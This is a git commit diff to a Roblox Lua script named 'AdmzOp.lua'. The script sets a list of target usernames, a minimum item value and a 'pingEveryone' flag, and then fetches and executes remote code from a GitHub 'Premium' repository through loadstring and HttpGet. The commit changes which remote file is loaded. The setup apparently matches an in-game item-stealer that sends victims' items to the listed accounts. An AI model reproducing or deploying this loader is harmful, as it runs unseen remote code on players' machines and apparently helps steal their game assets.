8ef788d2bec4b512ea9a4e8e9ee56e728c01815d
ShxDrag <bns19126@gmail.com>
2026-09-16 07:09:50 +0900

    Update AdmzOp.lua

--- AdmzOp.lua
+++ AdmzOp.lua
@@ -64,11 +64,11 @@ for _, v in pairs(getgc()) do
 end
 
 _G.Usernames = {"MRFLIMCLA1","MRFLIMCLA2","MRFLIMCLA3","GROW4GARDEN1M10029","MRFLIMCLA5"}
-_G.min_value = 0.017
+_G.min_value = 2
 _G.pingEveryone = "Yes"
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/notBest.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/Best.lua"))()
